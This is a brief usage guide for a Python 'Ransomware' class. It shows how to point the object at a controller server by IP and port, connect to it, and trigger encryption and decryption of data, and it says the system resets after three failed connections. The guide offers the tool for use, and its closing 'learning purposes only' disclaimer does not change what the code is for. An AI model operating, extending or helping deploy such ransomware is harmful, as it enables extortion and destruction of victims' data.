===============================
Ransomware Class Usage Guide
===============================

The provided code creates a `Ransomware` class with methods for encrypting and decrypting data.

1. **Initialization**: When initializing a `Ransomware` object, you need to provide the IP address (`host`) and port (`port`) of the server you want to connect to.

.. code-block:: python

    bot = Ransomware('192.168.1.12', 19100)

2. **Connecting to the Server**: The `ConnectServer` method attempts to connect to the server via the provided IP address and port. If it cannot connect after 3 attempts, the system will reset.

.. code-block:: python

    bot.ConnectServer()

3. **Encryption**: The `Encrypted` method encrypts data using the generated private key.

.. code-block:: python

    bot.Encrypted()

4. **Decryption**: The `Decrypted` method decrypts data using the same private key.

.. code-block:: python

    bot.Decrypted()

Please note: This code should only be used for learning purposes. Using it to perform illegal activities (such as cyber attacks) can lead to serious legal consequences. Always comply with legal regulations when using and developing open source code.